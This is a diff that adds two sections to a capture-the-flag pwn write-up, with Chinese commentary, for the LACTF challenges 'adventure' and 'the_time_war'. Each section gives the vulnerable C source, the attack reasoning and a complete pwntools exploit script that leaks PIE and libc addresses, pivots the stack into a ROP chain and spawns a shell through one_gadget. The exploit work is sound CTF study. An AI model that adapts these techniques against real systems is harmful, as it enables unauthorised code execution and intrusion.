@@ -716,3 +716,671 @@ def attack():
 
 attack()
 ```
+
+## adventure
+
+### checksec
+
+```
+[*] '/home/RatherHard/CTF-pwn/LACTF/adventure/chall'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+### code
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int main(void);
+
+#define BOARD_SIZE 16
+#define MAX_MOVES 300
+#define INPUT_SIZE 8
+#define NUM_ITEMS 8
+
+char history[MAX_MOVES][INPUT_SIZE];
+int move_count = 0;
+
+int player_x = 0;
+int player_y = 0;
+
+const char *last_item = "None";
+
+int board[BOARD_SIZE][BOARD_SIZE];
+
+const char *item_names[] = {
+    "Sword",
+    "Shield",
+    "Potion",
+    "Key",
+    "Scroll",
+    "Amulet",
+    "Crown",
+    "Flag"
+};
+
+const char item_symbols[] = {
+    'S', 'H', 'P', 'K', 'L', 'A', 'C', 'F'
+};
+
+int inventory[NUM_ITEMS] = {0};
+
+void print_banner(void) {
+    puts("");
+    puts("    ╔═══════════════════════════════════════════╗");
+    puts("    ║     ⚔️  ADVENTURE IN THE DARK MAZE ⚔️      ║");
+    puts("    ║         ~ A Quest for Glory ~             ║");
+    puts("    ╚═══════════════════════════════════════════╝");
+    puts("");
+    puts("  In the ancient dungeon of the Forgotten Realm,");
+    puts("  treasures await the brave adventurer...");
+    puts("");
+}
+
+void print_help(void) {
+    puts("");
+    puts("  ┌─────────── COMMANDS ───────────┐");
+    puts("  │  n/s/e/w  - Move North/South/  │");
+    puts("  │             East/West          │");
+    puts("  │  look     - Look around        │");
+    puts("  │  inv      - Check inventory    │");
+    puts("  │  grab     - Pick up item       │");
+    puts("  │  help     - Show this help     │");
+    puts("  │  quit     - Leave the dungeon  │");
+    puts("  └────────────────────────────────┘");
+    puts("");
+}
+
+void print_inventory(void) {
+    puts("");
+    puts("  ╔═════════ INVENTORY ═════════╗");
+    int item_count = 0;
+    for (int i = 0; i < NUM_ITEMS; i++) {
+        if (inventory[i]) {
+            printf("  ║  [%c] %-22s ║\n", item_symbols[i], item_names[i]);
+            item_count++;
+        }
+    }
+    if (item_count == 0) {
+        puts("  ║   (empty)                   ║");
+    }
+    puts("  ╠═════════════════════════════╣");
+    printf("  ║  %2d,%2d %d/%d %3d/%3d %-6s   ║\n",
+           player_x, player_y, item_count, NUM_ITEMS, move_count, MAX_MOVES, last_item);
+    puts("  ╚═════════════════════════════╝");
+    puts("");
+}
+
+void look_around(void) {
+    puts("");
+    puts("  ~~ You peer into the darkness ~~");
+    printf("  You stand at position (%d, %d).\n", player_x, player_y);
+
+    if (board[player_y][player_x] > 0) {
+        int item_idx = board[player_y][player_x] - 1;
+        printf("  A glimmering %s lies at your feet!\n", item_names[item_idx]);
+    } else {
+        puts("  The cold stone floor is bare.");
+    }
+    puts("");
+}
+
+void check_flag_password(void) {
+    char password[0020];
+    puts("");
+    puts("  ╔═══════════════════════════════════════╗");
+    puts("  ║  The sacred Flag pulses with power!   ║");
+    puts("  ║  Speak the ancient password to        ║");
+    puts("  ║  unlock its secrets...                ║");
+    puts("  ╚═══════════════════════════════════════╝");
+    puts("");
+    printf("  Password: ");
+    fflush(stdout);
+
+    if (fgets(password, 0x20, stdin) == NULL) {
+        return;
+    }
+    password[strcspn(password, "\n")] = 0;
+
+    if (strcmp(password, "easter_egg") == 0) {
+        puts("");
+        puts("  *** CONGRATULATIONS! ***");
+        puts("  The Flag's magic flows through you!");
+        puts("  You have conquered the dungeon!");
+        puts("");
+    } else {
+        puts("");
+        puts("  The Flag rejects your words...");
+        puts("  But you keep it anyway.");
+        puts("");
+    }
+}
+
+void grab_item(void) {
+    if (board[player_y][player_x] == 0) {
+        puts("  There is nothing here to grab.");
+        return;
+    }
+
+    int item_idx = board[player_y][player_x] - 1;
+    printf("  You pick up the %s!\n", item_names[item_idx]);
+    inventory[item_idx] = 1;
+    board[player_y][player_x] = 0;
+    last_item = item_names[item_idx];
+
+    if (item_idx == 7) {
+        check_flag_password();
+    }
+}
+
+void move_player(int dx, int dy) {
+    int new_x = player_x + dx;
+    int new_y = player_y + dy;
+
+    if (new_x < 0 || new_x >= BOARD_SIZE || new_y < 0 || new_y >= BOARD_SIZE) {
+        puts("  You bump into a cold stone wall.");
+        return;
+    }
+
+    player_x = new_x;
+    player_y = new_y;
+
+    const char *directions[] = {"north", "south", "east", "west"};
+    int dir_idx = (dy == -1) ? 0 : (dy == 1) ? 1 : (dx == 1) ? 2 : 3;
+    printf("  You venture %s...\n", directions[dir_idx]);
+
+    if (board[player_y][player_x] > 0) {
+        int item_idx = board[player_y][player_x] - 1;
+        printf("  You spot a %s here!\n", item_names[item_idx]);
+    }
+}
+
+void init_board(void) {
+    memset(board, 0, sizeof(board));
+
+    unsigned long addr = (unsigned long)main;
+    unsigned char *bytes = (unsigned char *)&addr;
+
+    for (int i = NUM_ITEMS - 1; i >= 0; i--) {
+        int x = (bytes[i] >> 4) & 0x0F;
+        int y = bytes[i] & 0x0F;
+
+        while (board[y][x] != 0) {
+            x = (x + 1) % BOARD_SIZE;
+            if (x == 0) y = (y + 1) % BOARD_SIZE;
+        }
+
+        board[y][x] = i + 1;
+    }
+}
+
+int main(void) {
+    char input[INPUT_SIZE];
+
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+
+    print_banner();
+    init_board();
+    print_help();
+
+    while (move_count < MAX_MOVES) {
+        printf("> ");
+        fflush(stdout);
+
+        if (fgets(input, sizeof(input), stdin) == NULL) {
+            break;
+        }
+
+        input[strcspn(input, "\n")] = 0;
+        strncpy(history[move_count], input, INPUT_SIZE - 1);
+        history[move_count][INPUT_SIZE - 1] = '\0';
+        move_count++;
+
+        if (strcmp(input, "n") == 0) {
+            move_player(0, -1);
+        } else if (strcmp(input, "s") == 0) {
+            move_player(0, 1);
+        } else if (strcmp(input, "e") == 0) {
+            move_player(1, 0);
+        } else if (strcmp(input, "w") == 0) {
+            move_player(-1, 0);
+        } else if (strcmp(input, "look") == 0) {
+            look_around();
+        } else if (strcmp(input, "inv") == 0) {
+            print_inventory();
+        } else if (strcmp(input, "grab") == 0) {
+            grab_item();
+        } else if (strcmp(input, "help") == 0) {
+            print_help();
+        } else if (strcmp(input, "quit") == 0) {
+            puts("");
+            puts("  You flee the dungeon in fear...");
+            puts("  Perhaps another day, brave adventurer.");
+            puts("");
+            break;
+        } else if (strlen(input) > 0) {
+            puts("  Unknown command. Type 'help' for options.");
+        }
+
+        if (move_count % 25 == 0 && move_count < MAX_MOVES) {
+            printf("  [%d moves remaining...]\n", MAX_MOVES - move_count);
+        }
+    }
+
+    if (move_count >= MAX_MOVES) {
+        puts("");
+        puts("  ════════════════════════════════════");
+        puts("  The dungeon's magic forces you out!");
+        puts("  You have exhausted your journey...");
+        puts("  ════════════════════════════════════");
+        puts("");
+    }
+
+    return 0;
+}
+```
+
+棋盘游戏，发现 main 的地址通过棋盘上 item 的坐标信息给出，可以泄露 PIE
+
+check_flag_password 有栈溢出，溢出 0x10 字节
+
+history 里面可以布置 ropchain 从而达成栈迁移
+
+### 攻击思路
+
+leak pie 之后在 history 上布置 ropchain ，通过 check_flag_password 的栈溢出把栈迁移到 history 上跑 ropchain 去 leak libc 顺便 reread
+
+然后 reread 的时候写入 onegadget 就行了
+
+### exp
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
+context.terminal = ['tmux', 'splitw', '-h']
+
+debug = 1
+
+file = './chall_patched'
+elf = ELF(file)
+libc = ELF('./libc.so.6')
+
+libcoffsetdict = {}
+libcrealdict = {}
+
+def libcdict_add(name, addr):
+    if addr > 0x1000000:
+        libcrealdict[name] = addr
+        addr %= 0x1000
+    libcoffsetdict[name] = addr
+
+def getlibc():
+    global libc
+    if not debug:
+        libc = ELF(libcdb.search_by_symbol_offsets(libcoffsetdict))
+
+def initlibc():
+    if not debug:
+        subprocess.run(['cp', libc.path, './libc.so.6'])
+        subprocess.run(['pwninit', '--no-template'])
+
+target = '60.205.163.215'
+port = 13774
+
+if debug:
+    p = process(file)
+else:
+    p = remote(target, port)
+
+io = p
+
+def dbg(cmd = ''):
+    if debug:
+        gdb.attach(p, gdbscript = cmd)
+
+def peek(num=4096):
+    message = p.recv(num)
+    p.unrecv(message)
+    return message
+
+s       = lambda data           :p.send(data)
+sl      = lambda data           :p.sendline(data)
+sa      = lambda x, data        :p.sendafter(x, data)
+sla     = lambda x, data        :p.sendlineafter(x, data)
+r       = lambda num=4096       :p.recv(num)
+ur      = lambda x              :p.unrecv(x)
+pk      = lambda num=4096       :peek(num)
+rl      = lambda num=4096       :p.recvline(num)
+ru      = lambda x              :p.recvuntil(x)
+itr     = lambda                :p.interactive()
+uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
+uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
+uru64   = lambda                :uu64(ru('\x7f')[-6:])
+leak    = lambda name           :log.success('{} = {}'.format(name, hex(eval(name))))
+
+item = {
+    b'Sword': 0,
+    b'Shield': 1,
+    b'Potion': 2,
+    b'Key': 3,
+    b'Scroll': 4,
+    b'Amulet': 5,
+    b'Crown': 6,
+    b'Flag': 7
+}
+
+nowx, nowy = 0, 0
+main_leak = 0
+pie_leak = 0
+
+def move(way):
+    global nowx, nowy 
+    if way == b'e':
+        nowx += 1
+    elif way == b'w':
+        nowx -= 1
+    elif way == b's':
+        nowy += 1
+    elif way == b'n':
+        nowy -= 1
+    sla(b'> ', way)
+
+def move_check(way):
+    global main_leak
+    gotit = b''
+    move(way)
+    rl()
+    if (pk(1) != b'>'):
+        r(2)
+        if r(1) == b'[':
+            return
+        ru(b'spot a ')
+        gotit = ru(b' ')[:-1]
+        if (item[gotit] <= 5):
+            main_leak |= (nowx << 4 | nowy) << (8 * item[gotit])
+
+def grab(pwd):
+    sla(b'> ', b'grab')
+    sa(b'Password: ', pwd[:-1])
+
+def write(data):
+    while data:
+        sla(b'> ', data[:6])
+        data = data[0x8:]
+
+def attack():
+    global pie_leak
+    for i in range(0x8):
+        for _ in range(0x10 - 1):
+            move_check(b'e')
+        move_check(b's')
+        for _ in range(0x10 - 1):
+            move_check(b'w')
+        if (i < 0x7):
+            move_check(b's')
+    pie_leak = main_leak - 0x1adf
+    leak('pie_leak')
+
+    for _ in range(0x10 - 1):
+        move(b'n')
+    
+    leave_ret = pie_leak + 0x172F
+    rw_addr = pie_leak + 0x4910     # history
+    reread = pie_leak + 0x164D
+    rop_leak_chain = flat([
+        rw_addr + 0x20,
+        pie_leak + 0x1480,      # leak with printf
+        0,
+        pie_leak + 0x3F98,      # last_item leak puts
+        rw_addr + 0x38,
+        reread
+    ])
+    write(rop_leak_chain)
+    payload = b'A' * 0x10 + p64(rw_addr) + p64(leave_ret)
+    grab(payload)
+    libc.address = uru64() - libc.sym['puts']
+    leak('libc.address')
+
+    xor_rax_ret = libc.address + 0xc75e9
+    pop_rbp_ret = pie_leak + 0x1233
+    one_gadget = libc.address + 0xef52b
+    rop_break_chain = flat([
+        xor_rax_ret,
+        pop_rbp_ret,
+        pie_leak + 0x6000,
+        one_gadget
+    ])
+    sl(rop_break_chain)
+    itr()
+
+attack()
+
+# 0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+# constraints:
+#   address rsp+0x68 is writable
+#   rsp & 0xf == 0
+#   rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
+#   rbx == NULL || (u16)[rbx] == NULL
+
+# 0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+# constraints:
+#   address rsp+0x68 is writable
+#   rsp & 0xf == 0
+#   rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
+#   rbx == NULL || (u16)[rbx] == NULL
+
+# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
+# constraints:
+#   address rbp-0x48 is writable
+#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
+#   [r12] == NULL || r12 == NULL || r12 is a valid envp
+
+# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
+# constraints:
+#   address rbp-0x50 is writable
+#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
+#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
+
+# 0x00000000000c75e9: xor rax, rax; ret;
+```
+
+## the_time_war
+
+### checksec
+
+```
+[*] '/home/RatherHard/CTF-pwn/LACTF/the_time_war/pwn_the_time_war'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+### code
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+void run();
+
+void init() {
+    setbuf(stdout, NULL);
+    srand(clock_gettime);
+}
+
+void run() {
+    short code[4];
+    for (int i = 0; i < 4; i ++) {
+        code[i] = rand() % 16;
+    }
+    printf("You see a locked box. The dial on the lock reads: %d-%d-%d-%d\n", code[0], code[1], code[2], code[3]);
+    printf("Which dial do you want to turn? ");
+    short ind1, val1, ind2, val2;
+    if (scanf("%hd", &ind1) <= 0) {
+        return;
+    }
+    printf("What do you want to set it to? ");
+    scanf("%hd", &val1);
+    printf("Second dial to turn? ");
+    scanf("%hd", &ind2);
+    printf("What do you want to set it to? ");
+    scanf("%hd", &val2);
+    code[ind1] = val1;
+    code[ind2] = val2;
+    printf("The box remains locked.\n");
+}
+
+int main(void) {
+    init();
+    run();
+    return 0;
+}
+```
+
+有两个越界写，可以用来劫持
+
+由于有 pie ，第一次劫持的时候需要去爆 1/16
+
+这题需要打 libc ，由于随机数种子为 clock_gettime 的地址的低 4 字节，我们可以去根据生成的随机数去爆破种子从而 leak libc 的一部分
+
+4 个随机数不够，8 个刚好
+
+最后通过伪造栈帧去打 onegadget 即可，不过会碰到缺 libc 的高 4 字节的问题，这一点可以通过把栈上残留值搬到缺失的位置上来解决，需要利用 scanf 解析失败保留原变量值的特性
+
+### exp
+
+```python
+from pwn import *
+from ctypes import CDLL
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
+context.terminal = ['tmux', 'splitw', '-h']
+
+debug = 1
+
+file = './pwn_the_time_war_patched'
+elf = ELF(file)
+libc = ELF('./libc.so.6')
+glibc = CDLL('libc.so.6')
+
+target = '60.205.163.215'
+port = 13774
+
+def conn():
+    if debug:
+        return process(file)
+    else:
+        return remote(target, port)
+
+def dbg(cmd = ''):
+    if debug:
+        gdb.attach(p, gdbscript = cmd)
+
+p = io = None
+
+s       = lambda data           :p.send(data)
+sl      = lambda data           :p.sendline(data)
+sa      = lambda x, data        :p.sendafter(x, data)
+sla     = lambda x, data        :p.sendlineafter(x, data)
+r       = lambda num=4096       :p.recv(num)
+rl      = lambda num=4096       :p.recvline(num)
+ru      = lambda x              :p.recvuntil(x)
+itr     = lambda                :p.interactive()
+uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
+uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
+uru64   = lambda                :uu64(ru('\x7f')[-6:])
+leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))
+
+numslot = []
+seed = 0
+
+def change(idx, val):
+    sla(b'turn? ', str(idx).encode())
+    sla(b'to? ', str(val).encode())
+
+def recvnum():
+    ru(b'lock reads: ')
+    for _ in range(3):
+        numslot.append(int(ru(b'-')[:-1]))
+    numslot.append(int(ru(b'\n')[:-1]))
+
+def hijacklow(idx, addr):
+    libc_low = seed - 0xcf420 + addr
+    change(10, 0x132A)
+    change(idx, libc_low & 0xffff)
+    change(10, 0x132A)
+    change(idx + 1, (libc_low >> 16) & 0xffff)
+
+def attack():
+    global p, io, numslot, seed
+    while True:
+        try:
+            p = io = conn()
+            numslot.clear()
+            recvnum()
+            change(10, 0x132A)
+            change(28, '+')
+            recvnum()
+        except:
+            p.close()
+            continue
+        break
+    log.info(f'{numslot}')
+    for i in range(0, 0x100000):
+        seed = i * 0x1000 + 0x420
+        glibc.srand(seed)
+        judgeslot = [glibc.rand() % 16 for _ in range(8)]
+        if judgeslot == numslot:
+            numslot.clear()
+            log.info(f"Found the correct seed: {hex(seed)}")
+            break
+    hijacklow(18, 0x319ad)
+    hijacklow(26, 0x4c139)
+    change(0, 0)
+    change(0, 0)
+    itr()
+
+attack()
+
+# 0x00000000000319ad: pop rbx; ret;
+
+# 0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+# constraints:
+#   address rsp+0x60 is writable
+#   rsp & 0xf == 0
+#   rax == NULL || {"sh", rax, r12, NULL} is a valid argv
+#   rbx == NULL || (u16)[rbx] == NULL
+
+# 0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+# constraints:
+#   address rsp+0x60 is writable
+#   rsp & 0xf == 0
+#   rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
+#   rbx == NULL || (u16)[rbx] == NULL
+
+# 0xd515f execve("/bin/sh", rbp-0x40, r13)
+# constraints:
+#   address rbp-0x38 is writable
+#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
+#   [r13] == NULL || r13 == NULL || r13 is a valid envp
+```
